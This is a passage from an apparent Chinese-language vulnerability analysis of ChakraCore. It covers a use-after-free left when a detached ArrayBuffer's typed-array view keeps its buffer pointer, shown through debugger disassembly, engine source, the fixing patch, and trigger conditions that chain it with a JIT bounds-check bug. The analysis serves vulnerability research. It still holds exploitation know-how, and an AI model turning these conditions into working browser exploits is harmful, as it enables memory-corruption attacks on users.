chakra!Js::ArrayBuffer::DetachAndGetState</span><br><span class="line">0:010&gt; g</span><br><span class="line">Breakpoint 3 hit</span><br><span class="line">chakra!Js::ArrayBuffer::DetachAndGetState:</span><br><span class="line">00007ffa`d30d8ab0 48894c2408 mov qword ptr [rsp+8],rcx ss:000000b0`396fb640=000001d915dc7e80</span><br><span class="line">0:010&gt; uf .</span><br><span class="line">chakra!Js::ArrayBuffer::DetachAndGetState:</span><br><span class="line">...</span><br><span class="line">00007ffa`d30d8b0a e8bdfdffff call chakra!Js::ArrayBuffer::ClearParentsLength (00007ffa`d30d88cc)</span><br><span class="line">...</span><br><span class="line">00007ffa`d30d8b46 c3 ret</span><br></pre></td></tr></table></figure></p><p>call chakra!Js::ArrayBuffer::ClearParentsLength<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120527.jpg" alt=""></p><ul><li>TypeId<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">enum TypeId</span><br><span class="line">&#123;</span><br><span class="line">    TypeIds_Undefined = 0,</span><br><span class="line">    TypeIds_Null = 1,</span><br><span class="line"></span><br><span class="line">    TypeIds_UndefinedOrNull =  TypeIds_Null,</span><br><span class="line"></span><br><span class="line">    TypeIds_Boolean = 2,</span><br><span class="line"></span><br><span class="line">    // backend typeof() == &quot;number&quot; is true for typeIds</span><br><span class="line">    // between TypeIds_FirstNumberType &lt;= typeId &lt;= TypeIds_LastNumberType</span><br><span class="line">    TypeIds_Integer = 3,</span><br><span class="line">    TypeIds_FirstNumberType = TypeIds_Integer,</span><br><span class="line">    TypeIds_Number = 4,</span><br><span class="line">    TypeIds_Int64Number = 5,</span><br><span class="line">    TypeIds_UInt64Number = 6,</span><br><span class="line">    TypeIds_LastNumberType = TypeIds_UInt64Number,</span><br><span class="line"></span><br><span class="line">    TypeIds_String = 7,</span><br><span class="line">    TypeIds_Symbol = 8,</span><br><span class="line"></span><br><span class="line">    TypeIds_LastToPrimitiveType = TypeIds_Symbol,</span><br><span class="line"></span><br><span class="line">    TypeIds_Enumerator = 9,</span><br><span class="line">    TypeIds_VariantDate = 10,</span><br><span class="line"></span><br><span class="line">    // SIMD types </span><br><span class="line">    //[Please maintain Float32x4 as the first SIMDType and Bool8x16 as the last]</span><br><span class="line">    TypeIds_SIMDFloat32x4 = 11,</span><br><span class="line">    TypeIds_SIMDFloat64x2 = 12,</span><br><span class="line">    TypeIds_SIMDInt32x4 = 13,</span><br><span class="line">    TypeIds_SIMDInt16x8 = 14,</span><br><span class="line">    TypeIds_SIMDInt8x16 = 15,</span><br><span class="line"></span><br><span class="line">    TypeIds_SIMDUint32x4 = 16,</span><br><span class="line">    TypeIds_SIMDUint16x8 = 17,</span><br><span class="line">    TypeIds_SIMDUint8x16 = 18,</span><br><span class="line"></span><br><span class="line">    TypeIds_SIMDBool32x4 = 19,</span><br><span class="line">    TypeIds_SIMDBool16x8 = 20,</span><br><span class="line">    TypeIds_SIMDBool8x16 = 21,</span><br><span class="line">    TypeIds_LastJavascriptPrimitiveType = TypeIds_SIMDBool8x16,</span><br><span class="line"></span><br><span class="line">    TypeIds_HostDispatch = 22,</span><br><span class="line">    TypeIds_WithScopeObject = 23,</span><br><span class="line">    TypeIds_UndeclBlockVar = 24,</span><br><span class="line"></span><br><span class="line">    TypeIds_LastStaticType = TypeIds_UndeclBlockVar,</span><br><span class="line"></span><br><span class="line">    TypeIds_Proxy = 25,</span><br><span class="line">    TypeIds_Function = 26,</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    // The backend expects only objects whose typeof() === &quot;object&quot; to have a</span><br><span class="line">    // TypeId &gt;= TypeIds_Object. Only &apos;null&apos; is a special case because it</span><br><span class="line">    // has a static type.</span><br><span class="line">    //</span><br><span class="line">    TypeIds_Object = 27,</span><br><span class="line">    TypeIds_Array = 28,</span><br><span class="line">    TypeIds_ArrayFirst = TypeIds_Array,</span><br><span class="line">    TypeIds_NativeIntArray = 29,</span><br><span class="line">  #if ENABLE_COPYONACCESS_ARRAY</span><br><span class="line">    TypeIds_CopyOnAccessNativeIntArray = 30,</span><br><span class="line">  #endif</span><br><span class="line">    TypeIds_NativeFloatArray = 31,</span><br><span class="line">    TypeIds_ArrayLast = TypeIds_NativeFloatArray,</span><br><span class="line">    TypeIds_Date = 32,</span><br><span class="line">    TypeIds_RegEx = 33,</span><br><span class="line">    TypeIds_Error = 34,</span><br><span class="line">    TypeIds_BooleanObject = 35,</span><br><span class="line">    TypeIds_NumberObject = 36,</span><br><span class="line">    TypeIds_StringObject = 37,</span><br><span class="line">    TypeIds_SIMDObject = 38,</span><br><span class="line">    TypeIds_Arguments = 39,</span><br><span class="line">    TypeIds_ES5Array = 40,</span><br><span class="line">    TypeIds_ArrayBuffer = 41,</span><br><span class="line">    TypeIds_Int8Array = 42,</span><br><span class="line">    TypeIds_TypedArrayMin = TypeIds_Int8Array,</span><br><span class="line">    TypeIds_TypedArraySCAMin = TypeIds_Int8Array, // Min SCA supported TypedArray TypeId</span><br><span class="line">    TypeIds_Uint8Array = 43,</span><br><span class="line">    TypeIds_Uint8ClampedArray = 44,</span><br><span class="line">    TypeIds_Int16Array = 45,</span><br><span class="line">    TypeIds_Uint16Array = 46,</span><br><span class="line">    TypeIds_Int32Array = 47,</span><br><span class="line">    TypeIds_Uint32Array = 48,//----&gt;0x30</span><br><span class="line">    TypeIds_Float32Array = 49,</span><br><span class="line">    TypeIds_Float64Array = 50,</span><br><span class="line">    TypeIds_TypedArraySCAMax = TypeIds_Float64Array, // Max SCA supported TypedArray TypeId</span><br><span class="line">    TypeIds_Int64Array = 51,</span><br><span class="line">    TypeIds_Uint64Array = 52,</span><br><span class="line">    TypeIds_CharArray = 53,</span><br><span class="line">    TypeIds_BoolArray = 54,</span><br><span class="line">    TypeIds_TypedArrayMax = TypeIds_BoolArray,</span><br><span class="line">    TypeIds_EngineInterfaceObject = 55,</span><br><span class="line">    TypeIds_DataView = 56,</span><br><span class="line">    TypeIds_WinRTDate = 57,</span><br><span class="line">    TypeIds_Map = 58,</span><br><span class="line">    TypeIds_Set = 59,</span><br><span class="line">    TypeIds_WeakMap = 60,</span><br><span class="line">    TypeIds_WeakSet = 61,</span><br><span class="line">    TypeIds_SymbolObject = 62,</span><br><span class="line">    TypeIds_ArrayIterator = 63,</span><br><span class="line">    TypeIds_MapIterator = 64,</span><br><span class="line">    TypeIds_SetIterator = 65,</span><br><span class="line">    TypeIds_StringIterator = 66,</span><br><span class="line">    TypeIds_JavascriptEnumeratorIterator = 67,      /* Unused */</span><br><span class="line">    TypeIds_Generator = 68,</span><br><span class="line">    TypeIds_Promise = 69,</span><br><span class="line">    TypeIds_SharedArrayBuffer = 70,</span><br><span class="line"></span><br><span class="line">    TypeIds_WebAssemblyModule = 71,</span><br><span class="line">    TypeIds_WebAssemblyInstance = 72,</span><br><span class="line">    TypeIds_WebAssemblyMemory = 73,</span><br><span class="line">    TypeIds_WebAssemblyTable = 74,</span><br><span class="line"></span><br><span class="line">    TypeIds_LastBuiltinDynamicObject = TypeIds_WebAssemblyTable,</span><br><span class="line">    TypeIds_GlobalObject = 75,</span><br><span class="line">    TypeIds_ModuleRoot = 76,</span><br><span class="line">    TypeIds_LastTrueJavascriptObjectType = TypeIds_ModuleRoot,</span><br><span class="line"></span><br><span class="line">    TypeIds_HostObject = 77,</span><br><span class="line">    TypeIds_ActivationObject = 78,</span><br><span class="line">    TypeIds_SpreadArgument = 79,</span><br><span class="line">    TypeIds_ModuleNamespace = 80,</span><br><span class="line">    TypeIds_ListIterator = 81,</span><br><span class="line"></span><br><span class="line">    TypeIds_Limit //add a new TypeId before TypeIds_Limit or before TypeIds_LastTrueJavascriptObjectType</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><p><code>TypeIds_Uint32Array = 48,//----&gt;0x30</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120854.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; uf chakra!Js::ArrayBuffer::ClearParentsLength</span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength:</span><br><span class="line">00007ffa`d30d88cc 4889542410 mov qword ptr [rsp+10h],rdx</span><br><span class="line">00007ffa`d30d88d1 48894c2408 mov qword ptr [rsp+8],rcx</span><br><span class="line">00007ffa`d30d88d6 4883ec28 sub rsp,28h</span><br><span class="line">00007ffa`d30d88da 488b4c2438 mov rcx,qword ptr [rsp+38h]</span><br><span class="line">00007ffa`d30d88df 4885c9 test rcx,rcx----&gt;if TypedArrayBuffer==NULL,则直接return</span><br><span class="line">00007ffa`d30d88e2 742d je chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa`d30d8911) Branch--&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x18:</span><br><span class="line">00007ffa`d30d88e4 488bc1 mov rax,rcx</span><br><span class="line">00007ffa`d30d88e7 48c1e830 shr rax,30h</span><br><span class="line">00007ffa`d30d88eb 4883f801 cmp rax,1-----&gt;如果是一个small int值，那么其右移48位得到的值应该是1，不是TypedArray Object，则直接return</span><br><span class="line">00007ffa`d30d88ef 7420 je chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa`d30d8911) Branch ---&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x25:</span><br><span class="line">00007ffa`d30d88f1 e8fa8cd4ff call chakra!Js::JavascriptNumber::Is_NoTaggedIntCheck (00007ffa`d2e215f0)</span><br><span class="line">00007ffa`d30d88f6 84c0 test al,al-----&gt;如果是一个NoTaggedInt值，不是TypedArray Object，则直接return</span><br><span class="line">00007ffa`d30d88f8 7517 jne chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa`d30d8911) Branch----&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x2e:</span><br><span class="line">00007ffa`d30d88fa 488b4108 mov rax,qword ptr [rcx+8]</span><br><span class="line">00007ffa`d30d88fe 83382a cmp dword ptr [rax],2Ah //小于0x2A即42，即非TypedArray，则return</span><br><span class="line">00007ffa`d30d8901 7c0e jl chakra!Js::ArrayBuffer::ClearParentsLength+0x45 (00007ffa`d30d8911) Branch //--&gt;return</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x37:</span><br><span class="line">00007ffa`d30d8903 833836 cmp dword ptr [rax],36h //大于0x2A(42)，小于等于0x36(54)，则将长度置为0</span><br><span class="line"></span><br><span class="line">    TypeIds_Uint8Array = 43,</span><br><span class="line">    TypeIds_Uint8ClampedArray = 44,</span><br><span class="line">    TypeIds_Int16Array = 45,</span><br><span class="line">    TypeIds_Uint16Array = 46,</span><br><span class="line">    TypeIds_Int32Array = 47,</span><br><span class="line">    TypeIds_Uint32Array = 48,//----&gt;0x30</span><br><span class="line">    TypeIds_Float32Array = 49,</span><br><span class="line">    TypeIds_Float64Array = 50,</span><br><span class="line">    TypeIds_TypedArraySCAMax = TypeIds_Float64Array, // Max SCA supported TypedArray TypeId</span><br><span class="line">    TypeIds_Int64Array = 51,</span><br><span class="line">    TypeIds_Uint64Array = 52,</span><br><span class="line">    TypeIds_CharArray = 53,</span><br><span class="line">    TypeIds_BoolArray = 54,</span><br><span class="line"></span><br><span class="line">00007ffa`d30d8906 7e05 jle chakra!Js::ArrayBuffer::ClearParentsLength+0x41 (00007ffa`d30d890d) Branch----&gt;跳转</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x41:</span><br><span class="line">00007ffa`d30d890d 83612000 and dword ptr [rcx+20h],0-----&gt;将长度设置为0，但是未将View对ArrayBuffer Object对象申请的缓冲区的引用置NULL。</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x45:</span><br><span class="line">00007ffa`d30d8911 4883c428 add rsp,28h</span><br><span class="line">00007ffa`d30d8915 c3 ret</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120909.jpg" alt=""><br>将长度设置为0</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120924.jpg" alt=""></p><p>对应到ClearParentsLength源码中<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> ArrayBuffer::ClearParentsLength(ArrayBufferParent* pare nt)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (JavascriptOperators::GetTypeId(parent))</span><br><span class="line">    &#123;</span><br><span class="line">                            ...</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint32Array:</span><br><span class="line">                           ...</span><br><span class="line">            TypedArrayBase::FromVar(parent)-&gt;length = <span class="number">0</span>;-------------&gt;<span class="built_in">free</span> but no <span class="built_in">set</span> <span class="literal">NULL</span></span><br></pre></td></tr></table></figure></p><p><strong>注意此时其实ArrayBuffer Object所分配的buffer已经被释放了，所以可以被我们重新分配出来，占位。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120951.jpg" alt=""></p><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p><a href="https://github.com/Microsoft/ChakraCore/commit/1ae7e3ce95515758b4cd7215cb4e48539a0f4031" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/1ae7e3ce95515758b4cd7215cb4e48539a0f4031</a><br>patch就是将未置为NULL的指针置为NULL了<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+ <span class="keyword">void</span> TypedArrayBase::ClearLengthAndBufferOnDetach()</span><br><span class="line">+ &#123;</span><br><span class="line">+ AssertMsg(IsDetachedBuffer(), <span class="string">"Array buffer should be detached if we're calling this method"</span>);</span><br><span class="line">+</span><br><span class="line">+ <span class="keyword">this</span>-&gt;length = <span class="number">0</span>;</span><br><span class="line">+ <span class="keyword">this</span>-&gt;buffer = <span class="literal">nullptr</span>;</span><br><span class="line">+ &#125;</span><br><span class="line">+</span><br></pre></td></tr></table></figure></p><h3 id="虚表"><a href="#虚表" class="headerlink" title="虚表"></a>虚表</h3><p>从patch里找一个case<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TypeIds_Int32Array:</span><br><span class="line">                <span class="keyword">if</span> (Int32VirtualArray::Is(parent))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (VirtualTableInfo&lt;Int32VirtualArray&gt;::HasVirtualTable(parent))</span><br><span class="line">                    &#123;</span><br><span class="line">                        VirtualTableInfo&lt;Int32Array&gt;::SetVirtualTable(parent);</span><br><span class="line">                    &#125;</span><br><span class="line">...</span><br><span class="line">                &#125;</span><br><span class="line">                TypedArrayBase::FromVar(parent)-&gt;ClearLengthAndBufferOnDetach();</span><br><span class="line">                <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p><p>注意到patch里有这样的代码，目的是什么呢？<br>SetVirtualTable将虚表由Int32VirtualArray修改为Int32Array。<br>而我们知道0234触发的条件是如下代码，注意<code>IsLikelyOptimizedVirtualTypedArray</code><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;&amp; !Js::IsSimd128LoadStore(instr-&gt;m_opcode) <span class="comment">/*Always extract bounds for SIMD */</span>)</span><br><span class="line"> &#123;</span><br><span class="line">        ....</span><br><span class="line">         eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>这个Patch的目的仍然和0234有关，将漏洞联系起来看。<br>这样去修改虚表我测试了一下，暂时没找到什么可能引入的安全问题。</p><h2 id="开发者的Assumption"><a href="#开发者的Assumption" class="headerlink" title="开发者的Assumption"></a>开发者的Assumption</h2><p>即使存在对free了的内存的引用，由于MemGC，并不会直接造成UAF，因为不可占位。而且将length置为0，就不存在可以继续操作这个缓冲区的的可能。</p><ol><li>在开发者的假设里，MemGC对引用进行扫描，从而不释放仍有引用指向的缓冲区，可以很好的缓解UAF，<strong>但是通过控制ArrayBuffer的长度，我们可以让它使用VirtualAlloc分配，而不是GC</strong>。于是就没有上述的检查。</li><li>其实不把指针置为NULL这种写法理论上并不一定能造成影响，因为我们已经把length置为0了，理论上说我们已经无法控制分配的缓冲区了，无法读写。<br><strong>但是由于利用0234，可以在JIT时消除上界下界，于是我们就有了一个越界读写，可以打破length等于0给我们造成的限制。</strong></li></ol><h2 id="Pattern"><a href="#Pattern" class="headerlink" title="Pattern"></a>Pattern</h2><p>这个漏洞的发现是由0234逐次引入的，要找到一个UAF，首先要定位到一个<strong>可控对象的释放操作</strong>，这也是我不熟知的一个点。<br>还有就是在其中找到直接将length置为0，就“不可操作”了，这种释放方式。<br>从该函数的其他case可以看到dataview也是这么操作的，删除Length但是不置NULL，但是由于无法触发JIT的消除边界优化，所以更难以利用了。（也被一起补了）<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TypeIds_DataView:</span><br><span class="line">    DataView::FromVar(parent)-&gt;length = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="0234（OOB）触发的条件（由有限到推广）"><a href="#0234（OOB）触发的条件（由有限到推广）" class="headerlink" title="0234（OOB）触发的条件（由有限到推广）"></a>0234（OOB）触发的条件（由有限到推广）</h3><table><thead><tr><th>有限</th><th style="text-align:center">推广</th></tr></thead><tbody><tr><td>ArrayBuffer(0x10000)</td><td style="text-align:center">需要一个大于0x10000大小的buffer，这样才会让TypedArray的虚表类型是VirtualArray，从而触发JIT优化</td></tr><tr><td>Uint32Array(buffer)</td><td style="text-align:center"><strong>单个element size大于1字节的VirtualTypedArray</strong>（即除了Uint8Array和Int8Array）</td></tr><tr><td>循环次数足够大，触发JIT优化（循环体内是对数组的赋值，在优化后去掉边界检查）</td><td style="text-align:center">循环次数足够大，触发JIT优化（循环体内是对数组的赋值，在优化后去掉边界检查）</td></tr></tbody></table><h3 id="0236（UAF）触发的条件（由有限到推广）"><a href="#0236（UAF）触发的条件（由有限到推广）" class="headerlink" title="0236（UAF）触发的条件（由有限到推广）"></a>0236（UAF）触发的条件（由有限到推广）</h3><table><thead><tr><th>有限</th><th style="text-align:center">推广</th></tr></thead><tbody><tr><td>ArrayBuffer(0x10000)</td><td style="text-align:center">需要一个大于0x10000大小的buffer，使得通过VirtualAlloc分配，从而绕过MemGC的引用计数，延迟释放，才能引发UAF</td></tr><tr><td>Uint32Array(buffer)</td><td style="text-align:center">ArrayBuffer的一个parent对象。detach之后在其中仍然保留一个指向缓冲区的引用，从而造成UAF，注意这里不仅TypedArray可以UAF，DateView也可以。但是DataView无法和0234结合使用，不满足IsLikelyOptimizedVirtualTypedArray</td></tr><tr><td>worker.postMessage(buffer,[buffer]);worker.terminate();</td><td style="text-align:center">进行Detach，触发UAF</td></tr></tbody></table><h3 id="交集"><a href="#交集" class="headerlink" title="交集"></a>交集</h3><p><strong>关于虚表的部分补充在上面patch第二部分。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ArrayBuffer(<span class="number">0x10000</span>)</span><br><span class="line">Uint32Array(buffer)</span><br></pre></td></tr></table></figure><p>虽然PoC里这部分相同，但是目的却各不相同。<br>ArrayBuffer(0x10000)在0236的主要目的是绕过MemGC的UAF缓解机制</p><p>而在0234，目的则是由于通过VA分配，update虚表为VirtualArray，从而触发JIT优化。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;&amp; !Js::IsSimd128LoadStore(instr-&gt;m_opcode) <span class="comment">/*Always extract bounds for SIMD */</span>)</span><br><span class="line"> &#123;</span><br><span class="line">        ....</span><br><span class="line">         eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>update虚表操作如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chakra!Js::TypedArray&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>,<span class="number">0</span>,<span class="number">0</span>&gt;::TypedArray&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>,<span class="number">0</span>,<span class="number">0</span>&gt;+<span class="number">0xd1</span>:</span><br><span class="line"><span class="number">00007f</span>fa`d2c50f21 e8c6f7ffff call chakra!VirtualTableInfo&lt;Js::TypedArray&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>,<span class="number">0</span>,<span class="number">1</span>&gt; &gt;::SetVirtualTable (<span class="number">00007f</span>fa`d2c506ec)</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-065614.jpg" alt=""><br>源码如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> TypeName, <span class="keyword">bool</span> clamped, <span class="keyword">bool</span> virtualAllocated&gt;</span><br><span class="line">TypedArray&lt;TypeName, clamped, virtualAllocated&gt;::TypedArray(ArrayBufferBase* arrayBuffer, uint32 byteOffset, uint32 mappedLength, DynamicType* type) :</span><br><span class="line">    TypedArrayBase(arrayBuffer, byteOffset, mappedLength, <span class="keyword">sizeof</span>(TypeName), type)</span><br><span class="line">&#123;</span><br><span class="line">    AssertMsg(arrayBuffer-&gt;GetByteLength() &gt;= byteOffset, <span class="string">"invalid offset"</span>);</span><br><span class="line">    AssertMsg(mappedLength*<span class="keyword">sizeof</span>(TypeName)+byteOffset &lt;= arrayBuffer-&gt;GetByteLength(), <span class="string">"invalid length"</span>);</span><br><span class="line">    buffer = arrayBuffer-&gt;GetBuffer() + byteOffset;</span><br><span class="line">    <span class="keyword">if</span> (arrayBuffer-&gt;IsValidVirtualBufferLength(arrayBuffer-&gt;GetByteLength()) &amp;&amp;</span><br><span class="line">         (byteOffset == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">         (mappedLength == (arrayBuffer-&gt;GetByteLength() / <span class="keyword">sizeof</span>(TypeName)))</span><br><span class="line">       )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// update the vtable</span></span><br><span class="line">        <span class="keyword">switch</span> (type-&gt;GetTypeId())</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Int8Array:</span><br><span class="line">            VirtualTableInfo&lt;Int8VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint8Array:</span><br><span class="line">            VirtualTableInfo&lt;Uint8VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint8ClampedArray:</span><br><span class="line">            VirtualTableInfo&lt;Uint8ClampedVirtualArray&gt;::SetVirtualTable(<span 